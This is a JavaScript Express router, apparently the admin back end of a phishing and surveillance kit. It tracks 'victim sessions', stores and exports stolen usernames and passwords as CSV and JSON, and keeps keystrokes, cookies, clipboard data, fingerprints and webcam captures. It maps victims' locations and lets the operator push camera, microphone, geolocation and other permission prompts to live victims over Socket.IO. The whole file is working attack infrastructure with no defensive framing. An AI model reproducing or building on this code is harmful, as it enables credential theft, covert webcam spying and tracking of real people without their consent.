const express = require('express');
const router = express.Router();
const VictimSession = require('../models/VictimSession');
const StolenCredential = require('../models/StolenCredential');
const CameraCapture = require('../models/CameraCapture');
const ClickEvent = require('../models/ClickEvent');
const User = require('../models/User');
const AppSettings = require('../models/AppSettings');
const { authenticate, requireAdmin } = require('../middleware/auth');
const { deleteImage } = require('../services/cloudinaryUpload');

// All admin routes require authentication
router.use(authenticate);
router.use(requireAdmin);

// GET /api/admin/stats - Dashboard statistics
router.get('/stats', async (req, res) => {
  try {
    const now = new Date();
    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    const last24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    const last7d = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);

    const [
      totalSessions,
      onlineNow,
      sessionsToday,
      sessions24h,
      sessions7d,
      totalCredentials,
      credentialsToday,
      camerasGranted,
      totalCameraCaptures
    ] = await Promise.all([
      VictimSession.countDocuments(),
      VictimSession.countDocuments({ isOnline: true, lastActiveAt: { $gte: new Date(Date.now() - 5 * 60 * 1000) } }),
      VictimSession.countDocuments({ createdAt: { $gte: todayStart } }),
      VictimSession.countDocuments({ createdAt: { $gte: last24h } }),
      VictimSession.countDocuments({ createdAt: { $gte: last7d } }),
      StolenCredential.countDocuments(),
      StolenCredential.countDocuments({ capturedAt: { $gte: todayStart } }),
      VictimSession.countDocuments({ cameraAccessGranted: true }),
      CameraCapture.countDocuments()
    ]);

    // Geographic distribution
    const geoDistribution = await VictimSession.aggregate([
      { $match: { 'geolocation.country': { $ne: '' } } },
      { $group: { _id: '$geolocation.country', count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 20 }
    ]);

    // Browser distribution
    const browserDist = await VictimSession.aggregate([
      { $group: { _id: '$browser', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    // OS distribution
    const osDist = await VictimSession.aggregate([
      { $group: { _id: '$os', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    // Device type distribution
    const deviceDist = await VictimSession.aggregate([
      { $group: { _id: '$deviceType', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    // Top credential sources
    const topSources = await StolenCredential.aggregate([
      { $group: { _id: '$source', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    // Credentials over time (last 7 days)
    const credentialsOverTime = await StolenCredential.aggregate([
      { $match: { capturedAt: { $gte: last7d } } },
      { $group: { _id: { $dateToString: { format: '%Y-%m-%d', date: '$capturedAt' } }, count: { $sum: 1 } } },
      { $sort: { _id: 1 } }
    ]);

    // Strength distribution
    const strengthDist = await StolenCredential.aggregate([
      { $group: { _id: '$strength', count: { $sum: 1 } } }
    ]);

    // Top URLs where credentials were captured
    const topUrls = await StolenCredential.aggregate([
      { $match: { url: { $ne: '' } } },
      { $group: { _id: '$url', count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 10 }
    ]);

    res.json({
      totalSessions,
      onlineNow,
      sessionsToday,
      sessions24h,
      sessions7d,
      totalCredentials,
      credentialsToday,
      camerasGranted,
      totalCameraCaptures,
      geoDistribution,
      browserDist,
      osDist,
      deviceDist,
      topSources,
      credentialsOverTime,
      strengthDist,
      topUrls,
      captureRate: totalSessions > 0 ? ((totalCredentials / totalSessions) * 100).toFixed(1) : 0,
      cameraRate: totalSessions > 0 ? ((camerasGranted / totalSessions) * 100).toFixed(1) : 0
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/sessions - List all victim sessions
router.get('/sessions', async (req, res) => {
  try {
    const { page = 1, limit = 20, search, status, country, hasCredentials, hasCamera, sortBy = '-createdAt' } = req.query;
    
    const query = {};
    
    if (search) {
      query.$or = [
        { ipAddress: { $regex: search, $options: 'i' } },
        { 'geolocation.city': { $regex: search, $options: 'i' } },
        { 'geolocation.country': { $regex: search, $options: 'i' } },
        { browser: { $regex: search, $options: 'i' } },
        { os: { $regex: search, $options: 'i' } },
        { sessionId: { $regex: search, $options: 'i' } },
        { landingPage: { $regex: search, $options: 'i' } }
      ];
    }
    
    if (status === 'online') query.isOnline = true;
    if (status === 'offline') query.isOnline = false;
    if (country) query['geolocation.country'] = country;
    if (hasCredentials === 'true') query['credentials.0'] = { $exists: true };
    if (hasCamera === 'true') query.cameraAccessGranted = true;

    const sortObj = {};
    if (sortBy.startsWith('-')) {
      sortObj[sortBy.substring(1)] = -1;
    } else {
      sortObj[sortBy] = 1;
    }

    const skip = (parseInt(page) - 1) * parseInt(limit);
    
    const [sessions, total] = await Promise.all([
      VictimSession.find(query)
        .sort(sortObj)
        .skip(skip)
        .limit(parseInt(limit))
        .select('-mouseMovements -keystrokes -localStorage -sessionStorage -cookies -canvasFingerprint -webglFingerprint -audioFingerprint -fontFingerprint -screenshots -formData -clipboardData')
        .lean(),
      VictimSession.countDocuments(query)
    ]);

    res.json({
      sessions,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/sessions/:id - Full session detail
router.get('/sessions/:id', async (req, res) => {
  try {
    const session = await VictimSession.findById(req.params.id)
      .populate('credentials')
      .populate('cameraImages')
      .lean();

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    // Get click events
    const clickEvents = await ClickEvent.find({ sessionId: session._id })
      .sort({ timestamp: 1 })
      .limit(5000)
      .lean();

    // Compute session harvest summary stats
    const sessionHarvestSummary = {
      totalItems: session.sessionHarvest?.length || 0,
      sensitiveItems: (session.sessionHarvest || []).filter(h => h.sensitive).length,
      sources: [...new Set((session.sessionHarvest || []).map(h => h.source))],
      hasCredentials: (session.sessionHarvest || []).some(h => h.key?.toLowerCase().includes('password')),
      hasTokens: (session.sessionHarvest || []).some(h => h.key?.toLowerCase().includes('token'))
    };

    res.json({ ...session, clickEvents, sessionHarvestSummary });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// DELETE /api/admin/sessions/:id
router.delete('/sessions/:id', async (req, res) => {
  try {
    const session = await VictimSession.findById(req.params.id);
    if (!session) return res.status(404).json({ error: 'Session not found' });

    // Delete associated Cloudinary images first
    const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
    for (const capture of cameraCaptures) {
      if (capture.cloudinaryPublicId) {
        const cResult = await deleteImage(capture.cloudinaryPublicId);
        console.log(`🗑️ Session-delete Cloudinary [${capture.cloudinaryPublicId}]:`, cResult);
      }
    }

    await Promise.all([
      StolenCredential.deleteMany({ sessionId: session._id }),
      CameraCapture.deleteMany({ sessionId: session._id }),
      ClickEvent.deleteMany({ sessionId: session._id }),
      VictimSession.findByIdAndDelete(req.params.id)
    ]);

    res.json({ message: 'Session and all associated data deleted (Cloudinary images cleaned up)' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// DELETE /api/admin/sessions/bulk-delete
router.post('/sessions/bulk-delete', async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ error: 'No IDs provided' });
    }

    for (const id of ids) {
      const session = await VictimSession.findById(id);
      if (session) {
        // Delete associated Cloudinary images first
        const cameraCaptures = await CameraCapture.find({ sessionId: session._id });
        for (const capture of cameraCaptures) {
          if (capture.cloudinaryPublicId) {
            await deleteImage(capture.cloudinaryPublicId);
          }
        }

        await Promise.all([
          StolenCredential.deleteMany({ sessionId: session._id }),
          CameraCapture.deleteMany({ sessionId: session._id }),
          ClickEvent.deleteMany({ sessionId: session._id })
        ]);
      }
    }

    await VictimSession.deleteMany({ _id: { $in: ids } });
    res.json({ message: `Deleted ${ids.length} sessions (Cloudinary images cleaned up)` });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/credentials - List all stolen credentials
router.get('/credentials', async (req, res) => {
  try {
    const { page = 1, limit = 50, search, source, strength, sortBy = '-capturedAt' } = req.query;
    
    const query = {};
    if (search) {
      query.$or = [
        { username: { $regex: search, $options: 'i' } },
        { email: { $regex: search, $options: 'i' } },
        { url: { $regex: search, $options: 'i' } },
        { password: { $regex: search, $options: 'i' } }
      ];
    }
    if (source) query.source = source;
    if (strength) query.strength = strength;

    const sortObj = {};
    if (sortBy.startsWith('-')) {
      sortObj[sortBy.substring(1)] = -1;
    } else {
      sortObj[sortBy] = 1;
    }

    const skip = (parseInt(page) - 1) * parseInt(limit);

    const [credentials, total] = await Promise.all([
      StolenCredential.find(query)
        .sort(sortObj)
        .skip(skip)
        .limit(parseInt(limit))
        .populate({ path: 'sessionId', select: 'ipAddress geolocation browser os sessionId' })
        .lean(),
      StolenCredential.countDocuments(query)
    ]);

    res.json({
      credentials,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// DELETE /api/admin/credentials/:id
router.delete('/credentials/:id', async (req, res) => {
  try {
    const cred = await StolenCredential.findByIdAndDelete(req.params.id);
    if (!cred) return res.status(404).json({ error: 'Credential not found' });
    
    // Also remove reference from session
    await VictimSession.updateOne(
      { _id: cred.sessionId },
      { $pull: { credentials: cred._id } }
    );

    res.json({ message: 'Credential deleted' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/credentials/export/csv
router.get('/credentials/export/csv', async (req, res) => {
  try {
    const credentials = await StolenCredential.find()
      .populate({ path: 'sessionId', select: 'ipAddress geolocation browser os' })
      .lean();

    let csv = 'ID,Username,Password,Email,URL,Source,Strength,IP,Country,Browser,OS,Captured At\n';
    
    credentials.forEach(c => {
      const ip = c.sessionId?.ipAddress || c.ipAddress || '';
      const country = c.sessionId?.geolocation?.country || '';
      const browser = c.sessionId?.browser || '';
      const os = c.sessionId?.os || '';
      csv += `"${c._id}","${(c.username || '').replace(/"/g, '""')}","${(c.password || '').replace(/"/g, '""')}","${(c.email || '').replace(/"/g, '""')}","${(c.url || '').replace(/"/g, '""')}","${c.source}","${c.strength}","${ip}","${country}","${browser}","${os}","${c.capturedAt}"\n`;
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=credentials_export.csv');
    res.send(csv);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/credentials/export/json
router.get('/credentials/export/json', async (req, res) => {
  try {
    const credentials = await StolenCredential.find()
      .populate({ path: 'sessionId', select: 'ipAddress geolocation browser os sessionId userAgent' })
      .lean();

    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename=credentials_export.json');
    res.json(credentials);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/camera-captures
router.get('/camera-captures', async (req, res) => {
  try {
    const { page = 1, limit = 20 } = req.query;
    const skip = (parseInt(page) - 1) * parseInt(limit);

    const [captures, total] = await Promise.all([
      CameraCapture.find()
        .sort({ capturedAt: -1 })
        .skip(skip)
        .limit(parseInt(limit))
        .populate({ path: 'sessionId', select: 'ipAddress geolocation browser os sessionId' })
        .lean(),
      CameraCapture.countDocuments()
    ]);

    res.json({
      captures,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// DELETE /api/admin/camera-captures/:id - Delete a single camera capture (also removes from Cloudinary)
router.delete('/camera-captures/:id', async (req, res) => {
  try {
    const capture = await CameraCapture.findByIdAndDelete(req.params.id);
    if (!capture) return res.status(404).json({ error: 'Camera capture not found' });

    // Delete from Cloudinary if public ID exists
    let cloudinaryResult = null;
    if (capture.cloudinaryPublicId) {
      cloudinaryResult = await deleteImage(capture.cloudinaryPublicId);
      console.log(`🗑️ Deleted from Cloudinary [publicId=${capture.cloudinaryPublicId}]:`, cloudinaryResult);
    } else {
      console.warn(`⚠️ Camera capture ${capture._id} has no cloudinaryPublicId`);
    }

    // Also remove reference from session
    await VictimSession.updateOne(
      { _id: capture.sessionId },
      { $pull: { cameraImages: capture._id } }
    );

    res.json({
      message: 'Camera capture deleted',
      cloudinaryDeleted: cloudinaryResult?.success || false,
      note: cloudinaryResult?.reason || null
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/camera-captures/bulk-delete
router.post('/camera-captures/bulk-delete', async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ error: 'No IDs provided' });
    }

    const captures = await CameraCapture.find({ _id: { $in: ids } });
    
    // Delete from Cloudinary and remove references from sessions
    for (const capture of captures) {
      if (capture.cloudinaryPublicId) {
        const cResult = await deleteImage(capture.cloudinaryPublicId);
        console.log(`🗑️ Bulk-deleted from Cloudinary [${capture.cloudinaryPublicId}]:`, cResult);
      }
      await VictimSession.updateOne(
        { _id: capture.sessionId },
        { $pull: { cameraImages: capture._id } }
      );
    }

    await CameraCapture.deleteMany({ _id: { $in: ids } });
    res.json({ message: `Deleted ${ids.length} camera captures` });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/geolocation-map
router.get('/geolocation-map', async (req, res) => {
  try {
    const locations = await VictimSession.aggregate([
      { $match: { 'geolocation.lat': { $ne: null }, 'geolocation.lon': { $ne: null } } },
      { $group: {
          _id: { lat: '$geolocation.lat', lon: '$geolocation.lon', city: '$geolocation.city', country: '$geolocation.country' },
          count: { $sum: 1 },
          sessions: { $push: { id: '$_id', sessionId: '$sessionId', browser: '$browser', os: '$os', ip: '$ipAddress', hasCredentials: { $gt: [{ $size: { $ifNull: ['$credentials', []] } }, 0] }, cameraAccess: '$cameraAccessGranted' } }
      }},
      { $sort: { count: -1 } },
      { $limit: 200 }
    ]);

    res.json(locations);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/online-now
router.get('/online-now', async (req, res) => {
  try {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    const online = await VictimSession.find({
      isOnline: true,
      lastActiveAt: { $gte: fiveMinutesAgo }
    })
    .select('sessionId ipAddress browser os deviceType geolocation timeOnSite clickCount lastActiveAt')
    .lean();

    res.json(online);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// PUT /api/admin/sessions/:id/notes
router.put('/sessions/:id/notes', async (req, res) => {
  try {
    const { notes } = req.body;
    const session = await VictimSession.findByIdAndUpdate(
      req.params.id,
      { notes },
      { new: true }
    ).select('notes');
    
    res.json(session);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// PUT /api/admin/sessions/:id/tags
router.put('/sessions/:id/tags', async (req, res) => {
  try {
    const { tags } = req.body;
    const session = await VictimSession.findByIdAndUpdate(
      req.params.id,
      { tags: Array.isArray(tags) ? tags : [] },
      { new: true }
    ).select('tags');
    
    res.json(session);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// === PERMISSIONS API ===

// GET /api/admin/sessions/:id/permissions - Get permission status for a session
router.get('/sessions/:id/permissions', async (req, res) => {
  try {
    const session = await VictimSession.findById(req.params.id)
      .select('permissions cameraAccessGranted cameraAccessDenied sessionId')
      .lean();

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    res.json({
      sessionId: session._id,
      sessionIdStr: session.sessionId,
      permissions: session.permissions || {
        camera: { status: session.cameraAccessGranted ? 'granted' : session.cameraAccessDenied ? 'denied' : 'unknown' },
        microphone: { status: 'unknown' },
        geolocation: { status: 'unknown' },
        notifications: { status: 'unknown' },
        clipboard: { status: 'unknown' },
        bluetooth: { status: 'unknown' },
        midi: { status: 'unknown' },
        usb: { status: 'unknown' },
        persistentStorage: { status: 'unknown' },
        vibration: { status: 'unknown' },
        orientation: { status: 'unknown' },
        ambientLight: { status: 'unknown' },
        proximity: { status: 'unknown' }
      },
      cameraAccessGranted: session.cameraAccessGranted,
      cameraAccessDenied: session.cameraAccessDenied
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/sessions/:id/permissions/update - Update permission status from harvester report
router.post('/sessions/:id/permissions/update', async (req, res) => {
  try {
    const { permissions } = req.body;
    const session = await VictimSession.findById(req.params.id);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    session.permissions = {
      ...(session.permissions || {}),
      ...permissions,
      lastUpdated: new Date()
    };

    // Sync camera-specific fields from permissions report
    if (permissions.camera) {
      session.cameraAccessGranted = permissions.camera.status === 'granted';
      session.cameraAccessDenied = permissions.camera.status === 'denied';
    }

    await session.save();

    // Emit to admin
    const { emitToAdmin } = require('../socket');
    emitToAdmin('permissions-update', {
      sessionId: session._id,
      sessionIdStr: session.sessionId,
      permissions: session.permissions,
      timestamp: new Date()
    });

    res.json({ ok: true, permissions: session.permissions });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/admin/sessions/:id/permissions/trigger - Admin requests to trigger a permission on the victim
router.post('/sessions/:id/permissions/trigger', async (req, res) => {
  try {
    const { permissionType } = req.body;
    const validPermissions = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard', 'bluetooth', 'usb', 'midi'];
    
    if (!validPermissions.includes(permissionType)) {
      return res.status(400).json({ error: 'Invalid permission type. Valid: ' + validPermissions.join(', ') });
    }

    const session = await VictimSession.findById(req.params.id);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    if (!session.isOnline) {
      return res.status(400).json({ error: 'Session is offline. Cannot trigger permission.' });
    }

    // === Add to pending command queue for polling fallback ===
    session.pendingCommands = session.pendingCommands || [];
    session.pendingCommands.push({
      type: 'trigger-permission',
      permissionType,
      createdAt: new Date()
    });
    await session.save();

    // === Emit via Socket.IO for instant delivery ===
    const { getIO } = require('../socket');
    const io = getIO();
    
    io.to(session.sessionId).emit('admin-trigger-permission', {
      permissionType,
      timestamp: Date.now(),
      adminRequested: true
    });

    // Also emit to admin panel showing the trigger was sent
    const { emitToAdmin } = require('../socket');
    emitToAdmin('permission-triggered', {
      sessionId: session._id,
      sessionIdStr: session.sessionId,
      permissionType,
      timestamp: new Date()
    });

    res.json({ 
      ok: true, 
      message: `Permission '${permissionType}' trigger sent to session`,
      sessionId: session._id
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/camera-captures/recover - Find sessions that have camera access but no CameraCapture docs, or reconstruct missing ones
router.get('/camera-captures/recover', async (req, res) => {
  try {
    // Find sessions with cameraAccessGranted but sparse cameraImages
    const sessions = await VictimSession.find({
      cameraAccessGranted: true
    }).select('sessionId ipAddress cameraImages cameraAccessGranted').lean();

    const recoveryResults = [];
    
    for (const session of sessions) {
      const captureCount = await CameraCapture.countDocuments({ sessionId: session._id });
      
      if (captureCount === 0 && session.cameraImages && session.cameraImages.length > 0) {
        // cameraImages references exist but no CameraCapture docs - recreate them
        for (const imgId of session.cameraImages) {
          const existingCapture = await CameraCapture.findById(imgId);
          if (!existingCapture) {
            // The reference exists in session but not in CameraCapture collection
            // This could be from a failed save - flag it
            recoveryResults.push({
              sessionId: session._id,
              sessionIdStr: session.sessionId,
              issue: 'orphaned_reference',
              orphanedId: imgId
            });
          }
        }
      }
      
      if (captureCount === 0 && (!session.cameraImages || session.cameraImages.length === 0)) {
        // Camera was granted but no captures were saved
        recoveryResults.push({
          sessionId: session._id,
          sessionIdStr: session.sessionId,
          issue: 'no_captures_at_all',
          cameraAccessGranted: true
        });
      }
    }

    // Also check for any CameraCapture docs that aren't referenced in their session
    const allCaptures = await CameraCapture.find().lean();
    const orphanCaptures = [];
    
    for (const cap of allCaptures) {
      if (!cap.sessionId) {
        orphanCaptures.push(cap._id);
        continue;
      }
      const parentSession = await VictimSession.findById(cap.sessionId).select('cameraImages').lean();
      if (!parentSession) {
        orphanCaptures.push({ captureId: cap._id, sessionId: cap.sessionId, reason: 'parent_session_deleted' });
        continue;
      }
      if (!parentSession.cameraImages || !parentSession.cameraImages.some(id => id.toString() === cap._id.toString())) {
        // Capture exists but isn't in session's cameraImages array - fix it
        await VictimSession.updateOne(
          { _id: cap.sessionId },
          { $addToSet: { cameraImages: cap._id } }
        );
        orphanCaptures.push({ captureId: cap._id, sessionId: cap.sessionId, reason: 'fixed_missing_reference' });
      }
    }

    res.json({
      totalSessionsWithCameraAccess: sessions.length,
      totalCameraCaptures: allCaptures.length,
      recoveryResults,
      orphanCapturesFixed: orphanCaptures.filter(o => o.reason === 'fixed_missing_reference').length,
      orphanDetails: orphanCaptures
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// === GLOBAL SETTINGS API ===

// GET /api/admin/settings - Get global app settings
router.get('/settings', async (req, res) => {
  try {
    let settings = await AppSettings.findOne({ key: 'global' });
    if (!settings) {
      settings = await AppSettings.create({ key: 'global' });
    }
    res.json({
      autoForcePermissions: settings.autoForcePermissions,
      geoPrecision: settings.geoPrecision,
      updatedAt: settings.updatedAt
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// PUT /api/admin/settings - Update global app settings
router.put('/settings', async (req, res) => {
  try {
    const { autoForcePermissions, geoPrecision } = req.body;
    const update = {};
    if (autoForcePermissions !== undefined) update.autoForcePermissions = Boolean(autoForcePermissions);
    if (geoPrecision !== undefined) update.geoPrecision = geoPrecision;
    update.updatedAt = new Date();
    update.updatedBy = req.user?.email || 'admin';

    const settings = await AppSettings.findOneAndUpdate(
      { key: 'global' },
      { $set: update },
      { upsert: true, new: true }
    );

    res.json({
      autoForcePermissions: settings.autoForcePermissions,
      geoPrecision: settings.geoPrecision,
      updatedAt: settings.updatedAt
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// GET /api/admin/permissions/stats - Aggregate permissions overview
router.get('/permissions/stats', async (req, res) => {
  try {
    const stats = await VictimSession.aggregate([
      { $match: { permissions: { $exists: true, $ne: null } } },
      { $project: {
          hasCamera: { $eq: ['$permissions.camera.status', 'granted'] },
          hasMicrophone: { $eq: ['$permissions.microphone.status', 'granted'] },
          hasGeolocation: { $eq: ['$permissions.geolocation.status', 'granted'] },
          hasNotifications: { $eq: ['$permissions.notifications.status', 'granted'] },
          hasClipboard: { $eq: ['$permissions.clipboard.status', 'granted'] }
      }},
      { $group: {
          _id: null,
          totalWithPermissions: { $sum: 1 },
          cameraGranted: { $sum: { $cond: ['$hasCamera', 1, 0] } },
          microphoneGranted: { $sum: { $cond: ['$hasMicrophone', 1, 0] } },
          geolocationGranted: { $sum: { $cond: ['$hasGeolocation', 1, 0] } },
          notificationsGranted: { $sum: { $cond: ['$hasNotifications', 1, 0] } },
          clipboardGranted: { $sum: { $cond: ['$hasClipboard', 1, 0] } }
      }}
    ]);

    res.json(stats[0] || {
      totalWithPermissions: 0,
      cameraGranted: 0,
      microphoneGranted: 0,
      geolocationGranted: 0,
      notificationsGranted: 0,
      clipboardGranted: 0
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
